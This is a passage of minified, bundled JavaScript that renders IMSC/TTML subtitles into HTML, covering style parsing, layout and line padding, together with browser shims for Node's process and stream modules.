H,B,A,na,oa,ba,ha;if(W=ja,"region"===R.kind&&("lrtb"===(H=R.styleAttrs[m.byName.writingMode.qname])||"lr"===H?(P.ipd="lr",P.bpd="tb"):"rltb"===H||"rl"===H?(P.ipd="rl",P.bpd="tb"):"tblr"===H?(P.ipd="tb",P.bpd="lr"):"tbrl"!==H&&"tb"!==H||(P.ipd="tb",P.bpd="rl")),(H=R.styleAttrs[m.byName.linePadding.qname])&&0<H&&(B=Math.ceil(H*P.h)+"px","tb"===P.bpd?(W.style.paddingLeft=B,W.style.paddingRight=B):(W.style.paddingTop=B,W.style.paddingBottom=B),P.lp=H),(B=R.styleAttrs[m.byName.multiRowAlign.qname])&&"auto"!==B&&((A=document.createElement("span")).style.display="inline-block",A.style.textAlign=B,ja.appendChild(A),W=A,P.mra=B),R.styleAttrs[m.byName.fillLineGap.qname]&&(P.flg=!0),"span"===R.kind&&R.text)if(P.lp||P.mra||P.flg)for(A="",B=0;B<R.text.length;B++){var Y;A+=R.text.charAt(B),(55296>(H=R.text.charCodeAt(B))||56319<H||B===R.text.length)&&((Y=document.createElement("span")).textContent=A,ja.appendChild(Y),A="")}else ja.textContent=R.text;for(var Z in O.appendChild(ja),R.contents)Q(P,W,R.contents[Z]);if(O=[],(P.lp||P.mra||P.flg)&&"p"===R.kind){if(f(P,W,O,null),P.mra){for(Y=0;Y<O.length-1;Y++){var T;0!==(Z=O[Y].elements.length)&&!1===O[Y].br&&(na=document.createElement("br"),(T=O[Y].elements[Z-1].node).parentElement.insertBefore(na,T.nextSibling))}P.mra=null}if(P.lp){for(var pa in na=P.lp*P.h,O)T=O[pa].elements[O[pa].start_elem],Y=O[pa].elements[O[pa].end_elem],Z=Math.ceil(na)+"px",A="-"+Math.ceil(na)+"px",0!==O[pa].elements.length&&("lr"===P.ipd?(T.node.style.borderLeftColor=T.bgcolor||"#00000000",T.node.style.borderLeftStyle="solid",T.node.style.borderLeftWidth=Z,T.node.style.marginLeft=A):"rl"===P.ipd?(T.node.style.borderRightColor=T.bgcolor||"#00000000",T.node.style.borderRightStyle="solid",T.node.style.borderRightWidth=Z,T.node.style.marginRight=A):"tb"===P.ipd&&(T.node.style.borderTopColor=T.bgcolor||"#00000000",T.node.style.borderTopStyle="solid",T.node.style.borderTopWidth=Z,T.node.style.marginTop=A),"lr"===P.ipd?(Y.node.style.borderRightColor=Y.bgcolor||"#00000000",Y.node.style.borderRightStyle="solid",Y.node.style.borderRightWidth=Z,Y.node.style.marginRight=A):"rl"===P.ipd?(Y.node.style.borderLeftColor=Y.bgcolor||"#00000000",Y.node.style.borderLeftStyle="solid",Y.node.style.borderLeftWidth=Z,Y.node.style.marginLeft=A):"tb"===P.ipd&&(Y.node.style.borderBottomColor=Y.bgcolor||"#00000000",Y.node.style.borderBottomStyle="solid",Y.node.style.borderBottomWidth=Z,Y.node.style.marginBottom=A));P.lp=null}if(P.flg){for(pa=(na=l(W.getBoundingClientRect(),P)).before,na=na.after,T=Math.sign(na-pa),Y=0;Y<=O.length;Y++){var ia,S;if(Z=0===Y?pa:Y===O.length?na:(O[Y].before+O[Y-1].after)/2,0<Y)for(A=0;A<O[Y-1].elements.length;A++)null!==O[Y-1].elements[A].bgcolor&&0>T*((S=O[Y-1].elements[A]).after-Z)&&(ia=Math.ceil(Math.abs(Z-S.after))+"px",S.node.style.backgroundColor=S.bgcolor,"lr"===P.bpd?S.node.style.paddingRight=ia:"rl"===P.bpd?S.node.style.paddingLeft=ia:"tb"===P.bpd&&(S.node.style.paddingBottom=ia));if(Y<O.length)for(A=0;A<O[Y].elements.length;A++)null!==(S=O[Y].elements[A]).bgcolor&&0<T*(S.before-Z)&&(ia=Math.ceil(Math.abs(S.before-Z))+"px",S.node.style.backgroundColor=S.bgcolor,"lr"===P.bpd?S.node.style.paddingLeft=ia:"rl"===P.bpd?S.node.style.paddingRight=ia:"tb"===P.bpd&&(S.node.style.paddingTop=ia))}P.flg=null}}"region"===R.kind&&(f(P,W,O),"tb"===P.bpd&&P.enableRollUp&&0<R.contents.length&&"after"===R.styleAttrs[m.byName.displayAlign.qname]&&(oa=new p(""===R.id?"_":R.id,O),P.currentISDState[oa.id]=oa,P.previousISDState&&oa.id in P.previousISDState&&0<P.previousISDState[oa.id].plist.length&&1<oa.plist.length&&oa.plist[oa.plist.length-2].text===P.previousISDState[oa.id].plist[P.previousISDState[oa.id].plist.length-1].text&&(ba=ja.firstElementChild,ha=oa.plist[oa.plist.length-1].after-oa.plist[oa.plist.length-1].before,ba.style.bottom="-"+ha+"px",ba.style.transition="transform 0.4s",ba.style.position="relative",ba.style.transform="translateY(-"+ha+"px)")))}else if(P=P.errorHandler,R="Error processing ISD element kind: "+R.kind,P&&P.error&&P.error(R))throw R}(J,w,x.contents[h]);return J.currentISDState};var r,t=[new g("http://www.w3.org/ns/ttml#styling backgroundColor",(function(x,z,J,E){0!==E[3]&&(z.style.backgroundColor="rgba("+E[0].toString()+","+E[1].toString()+","+E[2].toString()+","+(E[3]/255).toString()+")")})),new g("http://www.w3.org/ns/ttml#styling color",(function(x,z,J,E){z.style.color="rgba("+E[0].toString()+","+E[1].toString()+","+E[2].toString()+","+(E[3]/255).toString()+")"})),new g("http://www.w3.org/ns/ttml#styling direction",(function(x,z,J,E){z.style.direction=E})),new g("http://www.w3.org/ns/ttml#styling display",(function(x,z,J,E){})),new g("http://www.w3.org/ns/ttml#styling displayAlign",(function(x,z,J,E){z.style.display="flex",z.style.flexDirection="column","before"===E?z.style.justifyContent="flex-start":"center"===E?z.style.justifyContent="center":"after"===E&&(z.style.justifyContent="flex-end")})),new g("http://www.w3.org/ns/ttml#styling extent",(function(x,z,J,E){x.regionH=E.h*x.h,x.regionW=E.w*x.w;var D=E=0;(J=J.styleAttrs["http://www.w3.org/ns/ttml#styling padding"])&&(E=(J[0]+J[2])*x.h,D=(J[1]+J[3])*x.w),z.style.height=x.regionH-E+"px",z.style.width=x.regionW-D+"px"})),new g("http://www.w3.org/ns/ttml#styling fontFamily",(function(x,z,J,E){for(var D in x=[],E)"monospaceSerif"===E[D]?(x.push("Courier New"),x.push('"Liberation Mono"'),x.push("Courier"),x.push("monospace")):"proportionalSansSerif"===E[D]?(x.push("Arial"),x.push("Helvetica"),x.push('"Liberation Sans"'),x.push("sans-serif")):"monospace"===E[D]?x.push("monospace"):"sansSerif"===E[D]?x.push("sans-serif"):"serif"===E[D]?x.push("serif"):"monospaceSansSerif"===E[D]?(x.push("Consolas"),x.push("monospace")):"proportionalSerif"===E[D]?x.push("serif"):x.push(E[D]);z.style.fontFamily=x.join(",")})),new g("http://www.w3.org/ns/ttml#styling fontSize",(function(x,z,J,E){z.style.fontSize=E*x.h+"px"})),new g("http://www.w3.org/ns/ttml#styling fontStyle",(function(x,z,J,E){z.style.fontStyle=E})),new g("http://www.w3.org/ns/ttml#styling fontWeight",(function(x,z,J,E){z.style.fontWeight=E})),new g("http://www.w3.org/ns/ttml#styling lineHeight",(function(x,z,J,E){z.style.lineHeight="normal"===E?"normal":E*x.h+"px"})),new g("http://www.w3.org/ns/ttml#styling opacity",(function(x,z,J,E){z.style.opacity=E})),new g("http://www.w3.org/ns/ttml#styling origin",(function(x,z,J,E){z.style.top=E.h*x.h+"px",z.style.left=E.w*x.w+"px"})),new g("http://www.w3.org/ns/ttml#styling overflow",(function(x,z,J,E){z.style.overflow=E})),new g("http://www.w3.org/ns/ttml#styling padding",(function(x,z,J,E){(J=[])[0]=E[0]*x.h+"px",J[1]=E[3]*x.w+"px",J[2]=E[2]*x.h+"px",J[3]=E[1]*x.w+"px",z.style.padding=J.join(" ")})),new g("http://www.w3.org/ns/ttml#styling showBackground",null),new g("http://www.w3.org/ns/ttml#styling textAlign",(function(x,z,J,E){x=J.styleAttrs[m.byName.direction.qname],z.style.textAlign="start"===E?"rtl"===x?"right":"left":"end"===E?"rtl"===x?"left":"right":E})),new g("http://www.w3.org/ns/ttml#styling textDecoration",(function(x,z,J,E){z.style.textDecoration=E.join(" ").replace("lineThrough","line-through")})),new g("http://www.w3.org/ns/ttml#styling textOutline",(function(x,z,J,E){z.style.textShadow="none"===E?"":"rgba("+E.color[0].toString()+","+E.color[1].toString()+","+E.color[2].toString()+","+(E.color[3]/255).toString()+") 0px 0px "+E.thickness*x.h+"px"})),new g("http://www.w3.org/ns/ttml#styling unicodeBidi",(function(x,z,J,E){z.style.unicodeBidi="bidiOverride"===E?"bidi-override":E})),new g("http://www.w3.org/ns/ttml#styling visibility",(function(x,z,J,E){z.style.visibility=E})),new g("http://www.w3.org/ns/ttml#styling wrapOption",(function(x,z,J,E){"wrap"===E?"preserve"===J.space?z.style.whiteSpace="pre-wrap":z.style.whiteSpace="normal":"preserve"===J.space?z.style.whiteSpace="pre":z.style.whiteSpace="noWrap"})),new g("http://www.w3.org/ns/ttml#styling writingMode",(function(x,z,J,E){"lrtb"===E||"lr"===E||"rltb"===E||"rl"===E?z.style.writingMode="horizontal-tb":"tblr"===E?z.style.writingMode="vertical-lr":"tbrl"!==E&&"tb"!==E||(z.style.writingMode="vertical-rl")})),new g("http://www.w3.org/ns/ttml#styling zIndex",(function(x,z,J,E){z.style.zIndex=E})),new g("http://www.smpte-ra.org/schemas/2052-1/2010/smpte-tt backgroundImage",(function(x,z,J,E){var D,I;null!==x.imgResolver&&null!==E&&(D=document.createElement("img"),(I=x.imgResolver(E,D))&&(D.src=I),D.height=x.regionH,D.width=x.regionW,z.appendChild(D))})),new g("http://www.w3.org/ns/ttml/profile/imsc1#styling forcedDisplay",(function(x,z,J,E){x.displayForcedOnlyMode&&!1===E&&(z.style.visibility="hidden")}))];for(r in t);}(void 0===M?this.imscHTML={}:M,("undefined"==typeof imscNames&&u(18),"undefined"==typeof imscStyles?u(19):imscStyles))},{18:18,19:19}],16:[function(u,da,M){function v(g,t){if("contents"in g)for(var r in g.contents)v(g.contents[r],t);else t.push(g)}function m(g){if("br"!==g.kind){if("text"in g)return 0===g.text.length;if("contents"in g){for(var t=g.contents.length;t--;)m(g.contents[t])&&g.contents.splice(t,1);return 0===g.contents.length}}}function p(g){this.contents=[],this.aspectRatio=g.aspectRatio}function l(g){for(var t in this.kind=g.kind||"region",g.id&&(this.id=g.id),this.styleAttrs={},g.styleAttrs)this.styleAttrs[t]=g.styleAttrs[t];"text"in g?this.text=g.text:"br"!==g.kind&&(this.contents=[]),"space"in g&&(this.space=g.space)}da=void 0===M?this.imscISD={}:M,"undefined"==typeof imscNames&&u(18);var f="undefined"==typeof imscStyles?u(19):imscStyles;da.generateISD=function(g,t,r){var J,x=new p(g),z={};for(J in g.head.layout.regions){var E=function R(I,L,G,N,w,h,F,P,O){if(L<F.begin||L>=F.end)return null;if(h="regionID"in F&&""!==F.regionID?F.regionID:h,null!==w&&h!==G.id&&(!("contents"in F)||"contents"in F&&0===F.contents.length||""!==h))return null;var Q=new l(F);for(ja in F.sets)L<F.sets[ja].begin||L>=F.sets[ja].end||(Q.styleAttrs[F.sets[ja].qname]=F.sets[ja].value);var na,ia,ja={};for(var W in Q.styleAttrs){var aa;ja[W]=!0,W!==f.byName.writingMode.qname||f.byName.direction.qname in Q.styleAttrs||("lrtb"===(aa=Q.styleAttrs[W])||"lr"===aa?Q.styleAttrs[f.byName.direction.qname]="ltr":"rltb"!==aa&&"rl"!==aa||(Q.styleAttrs[f.byName.direction.qname]="rtl"))}if(null!==w)for(var ma in f.all){var H,B,A;(W=f.all[ma]).qname===f.byName.textDecoration.qname?(H=w.styleAttrs[W.qname],A=[],void 0===(B=Q.styleAttrs[W.qname])?A=H:-1===B.indexOf("none")?((-1===B.indexOf("noUnderline")&&-1!==H.indexOf("underline")||-1!==B.indexOf("underline"))&&A.push("underline"),(-1===B.indexOf("noLineThrough")&&-1!==H.indexOf("lineThrough")||-1!==B.indexOf("lineThrough"))&&A.push("lineThrough"),(-1===B.indexOf("noOverline")&&-1!==H.indexOf("overline")||-1!==B.indexOf("overline"))&&A.push("overline")):A.push("none"),Q.styleAttrs[W.qname]=A):W.inherit&&W.qname in w.styleAttrs&&!(W.qname in Q.styleAttrs)&&(Q.styleAttrs[W.qname]=w.styleAttrs[W.qname])}for(var Y in f.all)(ma=f.all[Y]).qname in Q.styleAttrs||("region"===Q.kind||!1===ma.inherit&&null!==ma.initial)&&(Q.styleAttrs[ma.qname]=ma.parse(ma.initial),ja[ma.qname]=!0);for(var Z in f.all)if((ma=f.all[Z]).qname in ja&&null!==ma.compute)if(null!==(Y=ma.compute(I,w,Q,Q.styleAttrs[ma.qname],O)))Q.styleAttrs[ma.qname]=Y;else if(Y="Style '"+ma.qname+"' on element '"+Q.kind+"' cannot be computed",P&&P.error&&P.error(Y))throw Y;if("none"===Q.styleAttrs[f.byName.display.qname])return null;for(var T in null===w?na=null===N?[]:[N]:"contents"in F&&(na=F.contents),na)null!==(w=R(I,L,G,N,Q,h,na[T],P,O))&&Q.contents.push(w.element);for(var pa in Q.styleAttrs)-1===f.byQName[pa].applies.indexOf(Q.kind)&&delete Q.styleAttrs[pa];if("span"===Q.kind&&Q.text&&"default"===Q.space&&(ia=Q.text.replace(/\s+/g," "),Q.text=ia),"p"===Q.kind){for(v(Q,I=[]),L=0,G="after_br",N=0;;)if("after_br"===G)L>=I.length||"br"===I[L].kind?(G="before_br",N=L,L--):("preserve"!==I[L].space&&(I[L].text=I[L].text.replace(/^\s+/g,"")),0<I[L].text.length?(G="looking_br",L++):I.splice(L,1));else if("before_br"===G)if(0>L||"br"===I[L].kind){if(G="after_br",(L=N+1)>=I.length)break}else if("preserve"!==I[L].space&&(I[L].text=I[L].text.replace(/\s+$/g,"")),0<I[L].text.length){if(G="after_br",(L=N+1)>=I.length)break}else I.splice(L,1),L--;else L>=I.length||"br"===I[L].kind?(G="before_br",N=L,L--):L++;m(Q)}return"div"===Q.kind&&f.byName.backgroundImage.qname in Q.styleAttrs||"br"===Q.kind||"contents"in Q&&0<Q.contents.length||"span"===Q.kind&&null!==Q.text||"region"===Q.kind&&"always"===Q.styleAttrs[f.byName.showBackground.qname]?{region_id:h,element:Q}:null}(g,t,g.head.layout.regions[J],g.body,null,"",g.head.layout.regions[J],r,z);null!==E&&x.contents.push(E.element)}return x}},{18:18,19:19}],17:[function(u,da,M){M.generateISD=u(16).generateISD,M.fromXML=u(14).fromXML,M.renderHTML=u(15).render},{14:14,15:15,16:16}],18:[function(u,da,M){(u=void 0===M?this.imscNames={}:M).ns_tt="http://www.w3.org/ns/ttml",u.ns_tts="http://www.w3.org/ns/ttml#styling",u.ns_ttp="http://www.w3.org/ns/ttml#parameter",u.ns_xml="http://www.w3.org/XML/1998/namespace",u.ns_itts="http://www.w3.org/ns/ttml/profile/imsc1#styling",u.ns_ittp="http://www.w3.org/ns/ttml/profile/imsc1#parameter",u.ns_smpte="http://www.smpte-ra.org/schemas/2052-1/2010/smpte-tt",u.ns_ebutts="urn:ebu:tt:style"},{}],19:[function(u,da,M){!function(v,m,p){function l(t,r,x,z,J,E,D,I){this.name=r,this.ns=t,this.qname=t+" "+r,this.inherit=J,this.animatable=E,this.initial=x,this.applies=z,this.parse=D,this.compute=I}for(var f in v.all=[new l(m.ns_tts,"backgroundColor","transparent",["body","div","p","region","span"],!1,!0,p.parseColor,null),new l(m.ns_tts,"color","white",["span"],!0,!0,p.parseColor,null),new l(m.ns_tts,"direction","ltr",["p","span"],!0,!0,(function(t){return t}),null),new l(m.ns_tts,"display","auto",["body","div","p","region","span"],!1,!0,(function(t){return t}),null),new l(m.ns_tts,"displayAlign","before",["region"],!1,!0,(function(t){return t}),null),new l(m.ns_tts,"extent","auto",["tt","region"],!1,!0,(function(t){if("auto"===t)return t;var r=t.split(" ");return 2!==r.length?null:(t=p.parseLength(r[0]),(r=p.parseLength(r[1]))&&t?{h:r,w:t}:null)}),(function(t,r,x,z,J){if("auto"===z)r=1;else if("%"===z.h.unit)r=z.h.value/100;else{if("px"!==z.h.unit)return null;r=z.h.value/t.pxDimensions.h}if("auto"===z)t=1;else if("%"===z.w.unit)t=z.w.value/100;else{if("px"!==z.w.unit)return null;t=z.w.value/t.pxDimensions.w}return{h:r,w:t}})),new l(m.ns_tts,"fontFamily","default",["span"],!0,!0,(function(t){t=t.split(",");var x,r=[];for(x in t)"'"!==t[x].charAt(0)&&'"'!==t[x].charAt(0)&&"default"===t[x]?r.push("monospaceSerif"):r.push(t[x]);return r}),null),new l(m.ns_tts,"fontSize","1c",["span"],!0,!0,p.parseLength,(function(t,r,x,z,J){if("%"===z.unit)t=null!==r?r.styleAttrs[v.byName.fontSize.qname]*z.value/100:z.value/100/t.cellResolution.h;else if("em"===z.unit)t=null!==r?r.styleAttrs[v.byName.fontSize.qname]*z.value:z.value/t.cellResolution.h;else if("c"===z.unit)t=z.value/t.cellResolution.h;else{if("px"!==z.unit)return null;t=z.value/t.pxDimensions.h}return t})),new l(m.ns_tts,"fontStyle","normal",["span"],!0,!0,(function(t){return t}),null),new l(m.ns_tts,"fontWeight","normal",["span"],!0,!0,(function(t){return t}),null),new l(m.ns_tts,"lineHeight","normal",["p"],!0,!0,(function(t){return"normal"===t?t:p.parseLength(t)}),(function(t,r,x,z,J){if("normal"===z)t=z;else if("%"===z.unit)t=x.styleAttrs[v.byName.fontSize.qname]*z.value/100;else if("em"===z.unit)t=x.styleAttrs[v.byName.fontSize.qname]*z.value;else if("c"===z.unit)t=z.value/t.cellResolution.h;else{if("px"!==z.unit)return null;t=z.value/t.pxDimensions.h}return t})),new l(m.ns_tts,"opacity",1,["region"],!1,!0,parseFloat,null),new l(m.ns_tts,"origin","auto",["region"],!1,!0,(function(t){if("auto"===t)return t;var r=t.split(" ");return 2!==r.length?null:(t=p.parseLength(r[0]),(r=p.parseLength(r[1]))&&t?{h:r,w:t}:null)}),(function(t,r,x,z,J){if("auto"===z)r=0;else if("%"===z.h.unit)r=z.h.value/100;else{if("px"!==z.h.unit)return null;r=z.h.value/t.pxDimensions.h}if("auto"===z)t=0;else if("%"===z.w.unit)t=z.w.value/100;else{if("px"!==z.w.unit)return null;t=z.w.value/t.pxDimensions.w}return{h:r,w:t}})),new l(m.ns_tts,"overflow","hidden",["region"],!1,!0,(function(t){return t}),null),new l(m.ns_tts,"padding","0px",["region"],!1,!0,(function(t){if(4<(t=t.split(" ")).length)return null;var x,r=[];for(x in t){var z=p.parseLength(t[x]);if(!z)return null;r.push(z)}return r}),(function(t,r,x,z,J){if(1===z.length)r=[z[0],z[0],z[0],z[0]];else if(2===z.length)r=[z[0],z[1],z[0],z[1]];else if(3===z.length)r=[z[0],z[1],z[2],z[1]];else{if(4!==z.length)return null;r=[z[0],z[1],z[2],z[3]]}if("lrtb"===(z=x.styleAttrs[v.byName.writingMode.qname])||"lr"===z)r=[r[0],r[3],r[2],r[1]];else if("rltb"===z||"rl"===z)r=[r[0],r[1],r[2],r[3]];else if("tblr"===z)r=[r[3],r[0],r[1],r[2]];else{if("tbrl"!==z&&"tb"!==z)return null;r=[r[3],r[2],r[1],r[0]]}for(var E in z=[],r)if(0===r[E].value)z[E]=0;else if("%"===r[E].unit)z[E]="0"===E||"2"===E?x.styleAttrs[v.byName.extent.qname].h*r[E].value/100:x.styleAttrs[v.byName.extent.qname].w*r[E].value/100;else if("em"===r[E].unit)z[E]=x.styleAttrs[v.byName.fontSize.qname]*r[E].value;else if("c"===r[E].unit)z[E]=r[E].value/t.cellResolution.h;else{if("px"!==r[E].unit)return null;z[E]="0"===E||"2"===E?r[E].value/t.pxDimensions.h:r[E].value/t.pxDimensions.w}return z})),new l(m.ns_tts,"showBackground","always",["region"],!1,!0,(function(t){return t}),null),new l(m.ns_tts,"textAlign","start",["p"],!0,!0,(function(t){return t}),(function(t,r,x,z,J){return"left"===z?"start":"right"===z?"end":z})),new l(m.ns_tts,"textDecoration","none",["span"],!0,!0,(function(t){return t.split(" ")}),null),new l(m.ns_tts,"textOutline","none",["span"],!0,!0,(function(t){if("none"===t)return t;var r={};if(0===(t=t.split(" ")).length||2<t.length)return null;var x=p.parseColor(t[0]);return null!==(r.color=x)&&t.shift(),1!==t.length?null:(t=p.parseLength(t[0]))?(r.thickness=t,r):null}),(function(t,r,x,z,J){if("none"===z)return z;if(r={},null===z.color?r.color=x.styleAttrs[v.byName.color.qname]:r.color=z.color,"%"===z.thickness.unit)r.thickness=x.styleAttrs[v.byName.fontSize.qname]*z.thickness.value/100;else if("em"===z.thickness.unit)r.thickness=x.styleAttrs[v.byName.fontSize.qname]*z.thickness.value;else if("c"===z.thickness.unit)r.thickness=z.thickness.value/t.cellResolution.h;else{if("px"!==z.thickness.unit)return null;r.thickness=z.thickness.value/t.pxDimensions.h}return r})),new l(m.ns_tts,"unicodeBidi","normal",["span","p"],!1,!0,(function(t){return t}),null),new l(m.ns_tts,"visibility","visible",["body","div","p","region","span"],!0,!0,(function(t){return t}),null),new l(m.ns_tts,"wrapOption","wrap",["span"],!0,!0,(function(t){return t}),null),new l(m.ns_tts,"writingMode","lrtb",["region"],!1,!0,(function(t){return t}),null),new l(m.ns_tts,"zIndex","auto",["region"],!1,!0,(function(t){var r;return"auto"===t?r=t:(r=parseInt(t),isNaN(r)&&(r=null)),r}),null),new l(m.ns_ebutts,"linePadding","0c",["p"],!0,!1,p.parseLength,(function(t,r,x,z,J){return"c"===z.unit?z.value/t.cellResolution.h:null})),new l(m.ns_ebutts,"multiRowAlign","auto",["p"],!0,!1,(function(t){return t}),null),new l(m.ns_smpte,"backgroundImage",null,["div"],!1,!1,(function(t){return t}),null),new l(m.ns_itts,"forcedDisplay","false",["body","div","p","region","span"],!0,!0,(function(t){return"true"===t}),null),new l(m.ns_itts,"fillLineGap","false",["p"],!0,!0,(function(t){return"true"===t}),null)],v.byQName={},v.all)v.byQName[v.all[f].qname]=v.all[f];for(var g in v.byName={},v.all)v.byName[v.all[g].name]=v.all[g]}(void 0===M?this.imscStyles={}:M,"undefined"==typeof imscNames?u(18):imscNames,"undefined"==typeof imscUtils?u(20):imscUtils)},{18:18,20:20}],20:[function(u,da,M){!function(v){var m=/#([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})?/,p=/rgb\(\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)/,l=/rgba\(\s*(\d+),\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)/,f={transparent:[0,0,0,0],black:[0,0,0,255],silver:[192,192,192,255],gray:[128,128,128,255],white:[255,255,255,255],maroon:[128,0,0,255],red:[255,0,0,255],purple:[128,0,128,255],fuchsia:[255,0,255,255],magenta:[255,0,255,255],green:[0,128,0,255],lime:[0,255,0,255],olive:[128,128,0,255],yellow:[255,255,0,255],navy:[0,0,128,255],blue:[0,0,255,255],teal:[0,128,128,255],aqua:[0,255,255,255],cyan:[0,255,255,255]};v.parseColor=function(t){var r,x=null,z=f[t.toLowerCase()];return void 0!==z?x=z:null!==(r=m.exec(t))?x=[parseInt(r[1],16),parseInt(r[2],16),parseInt(r[3],16),void 0!==r[4]?parseInt(r[4],16):255]:null!==(r=p.exec(t))?x=[parseInt(r[1]),parseInt(r[2]),parseInt(r[3]),255]:null!==(r=l.exec(t))&&(x=[parseInt(r[1]),parseInt(r[2]),parseInt(r[3]),parseInt(r[4])]),x};var g=/^((?:\+|\-)?\d*(?:\.\d+)?)(px|em|c|%)$/;v.parseLength=function(t){var r,x=null;return null!==(r=g.exec(t))&&(x={value:parseFloat(r[1]),unit:r[2]}),x}}(void 0===M?this.imscUtils={}:M)},{}],21:[function(u,da,M){"function"==typeof Object.create?da.exports=function(v,m){v.super_=m,v.prototype=Object.create(m.prototype,{constructor:{value:v,enumerable:!1,writable:!0,configurable:!0}})}:da.exports=function(v,m){function p(){}v.super_=m,p.prototype=m.prototype,v.prototype=new p,v.prototype.constructor=v}},{}],22:[function(u,da,M){function v(m){return!!m.constructor&&"function"==typeof m.constructor.isBuffer&&m.constructor.isBuffer(m)}da.exports=function(m){return null!=m&&(v(m)||"function"==typeof(p=m).readFloatLE&&"function"==typeof p.slice&&v(p.slice(0,0))||!!m._isBuffer);var p}},{}],23:[function(u,da,M){var v={}.toString;da.exports=Array.isArray||function(m){return"[object Array]"==v.call(m)}},{}],24:[function(u,da,M){(function(v){!v.version||0===v.version.indexOf("v0.")||0===v.version.indexOf("v1.")&&0!==v.version.indexOf("v1.8.")?da.exports={nextTick:function(m,p,l,f){if("function"!=typeof m)throw new TypeError('"callback" argument must be a function');var g=arguments.length;switch(g){case 0:case 1:return v.nextTick(m);case 2:return v.nextTick((function(){m.call(null,p)}));case 3:return v.nextTick((function(){m.call(null,p,l)}));case 4:return v.nextTick((function(){m.call(null,p,l,f)}));default:var t=Array(g-1);for(g=0;g<t.length;)t[g++]=arguments[g];return v.nextTick((function(){m.apply(null,t)}))}}}:da.exports=v}).call(this,u(25))},{25:25}],25:[function(u,da,M){function v(){throw Error("setTimeout has not been defined")}function m(){throw Error("clearTimeout has not been defined")}function p(I){if(r===setTimeout)return setTimeout(I,0);if((r===v||!r)&&setTimeout)return r=setTimeout,setTimeout(I,0);try{return r(I,0)}catch(L){try{return r.call(null,I,0)}catch(G){return r.call(this,I,0)}}}function l(){E&&z&&(E=!1,z.length?J=z.concat(J):D=-1,J.length&&f())}function f(){if(!E){var I=p(l);E=!0;for(var L=J.length;L;){for(z=J,J=[];++D<L;)z&&z[D].run();D=-1,L=J.length}z=null,E=!1,function(G){if(x===clearTimeout)return clearTimeout(G);if((x===m||!x)&&clearTimeout)return x=clearTimeout,clearTimeout(G);try{x(G)}catch(N){try{return x.call(null,G)}catch(w){return x.call(this,G)}}}(I)}}function g(I,L){this.fun=I,this.array=L}function t(){}u=da.exports={};try{var r="function"==typeof setTimeout?setTimeout:v}catch(I){r=v}try{var x="function"==typeof clearTimeout?clearTimeout:m}catch(I){x=m}var z,J=[],E=!1,D=-1;u.nextTick=function(I){var L=Array(arguments.length-1);if(1<arguments.length)for(var G=1;G<arguments.length;G++)L[G-1]=arguments[G];J.push(new g(I,L)),1!==J.length||E||p(f)},g.prototype.run=function(){this.fun.apply(null,this.array)},u.title="browser",u.browser=!0,u.env={},u.argv=[],u.version="",u.versions={},u.on=t,u.addListener=t,u.once=t,u.off=t,u.removeListener=t,u.removeAllListeners=t,u.emit=t,u.prependListener=t,u.prependOnceListener=t,u.listeners=function(I){return[]},u.binding=function(I){throw Error("process.binding is not supported")},u.cwd=function(){return"/"},u.chdir=function(I){throw Error("process.chdir is not supported")},u.umask=function(){return 0}},{}],26:[function(u,da,M){da.exports=u(27)},{27:27}],27:[function(u,da,M){function v(t){if(!(this instanceof v))return new v(t);f.call(this,t),g.call(this,t),t&&!1===t.readable&&(this.readable=!1),t&&!1===t.writable&&(this.writable=!1),this.allowHalfOpen=!0,t&&!1===t.allowHalfOpen&&(this.allowHalfOpen=!1),this.once("end",m)}function m(){this.allowHalfOpen||this._writableState.ended||l.nextTick(p,this)}function p(t){t.end()}var l=u(24);M=Object.keys||function(t){var x,r=[];for(x in t)r.push(x);return r},da.exports=v,(da=u(10)).inherits=u(21);var f=u(29),g=u(31);for(da.inherits(v,f),u=M(g.prototype),da=0;da<u.length;da++)M=u[da],v.prototype[M]||(v.prototype[M]=g.prototype[M]);Object.defineProperty(v.prototype,"writableHighWaterMark",{enumerable:!1,get:function(){return this._writableState.highWaterMark}}),Object.defineProperty(v.prototype,"destroyed",{get:function(){return void 0!==this._readableState&&void 0!==this._writableState&&this._readableState.destroyed&&this._writableState.destroyed},set:function(t){void 0!==this._readableState&&void 0!==this._writableState&&(this._readableState.destroyed=t,this._writableState.destroyed=t)}}),v.prototype._destroy=function(t,r){this.push(null),this.end(),l.nextTick(r,t)}},{10:10,21:21,24:24,29:29,31:31}],28:[function(u,da,M){function v(p){if(!(this instanceof v))return new v(p);m.call(this,p)}da.exports=v;var m=u(30);(da=u(10)).inherits=u(21),da.inherits(v,m),v.prototype._transform=function(p,l,f){f(null,p)}},{10:10,21:21,30:30}],29:[function(u,da,M){(function(v,m){function p(B,A){B=B||{},A=A instanceof(F=F||u(27)),this.objectMode=!!B.objectMode,A&&(this.objectMode=this.objectMode||!!B.readableObjectMode);var Y=B.highWaterMark,Z=B.readableHighWaterMark,na=this.objectMode?16:16384;this.highWaterMark=Y||0===Y?Y:A&&(Z||0===Z)?Z:na,this.highWaterMark=Math.floor(this.highWaterMark),this.buffer=new ma,this.length=0,this.pipes=null,this.pipesCount=0,this.flowing=null,this.reading=this.endEmitted=this.ended=!1,this.sync=!0,this.destroyed=this.resumeScheduled=this.readableListening=this.emittedReadable=this.needReadable=!1,this.defaultEncoding=B.defaultEncoding||"utf8",this.awaitDrain=0,this.readingMore=!1,this.encoding=this.decoder=null,B.encoding&&(ja=ja||u(42).StringDecoder,this.decoder=new ja(B.encoding),this.encoding=B.encoding)}function l(B){if(F=F||u(27),!(this instanceof l))return new l(B);this._readableState=new p(B,this),this.readable=!0,B&&("function"==typeof B.read&&(this._read=B.read),"function"==typeof B.destroy&&(this._destroy=B.destroy)),O.call(this)}function f(B,A,Y,Z,na){var T,pa,S,V,oa,ia=B._readableState;return null===A?(ia.reading=!1,S=B,(V=ia).ended||(!V.decoder||(oa=V.decoder.end())&&oa.length&&(V.buffer.push(oa),V.length+=V.objectMode?1:oa.length),V.ended=!0,r(S))):(na||(T=function(S,V){var oa;return R.isBuffer(V)||V instanceof Q||"string"==typeof V||void 0===V||S.objectMode||(oa=new TypeError("Invalid non-string/buffer chunk")),oa}(ia,A)),T?B.emit("error",T):ia.objectMode||A&&0<A.length?("string"==typeof A||ia.objectMode||Object.getPrototypeOf(A)===R.prototype||(pa=A,A=R.from(pa)),Z?ia.endEmitted?B.emit("error",Error("stream.unshift() after end 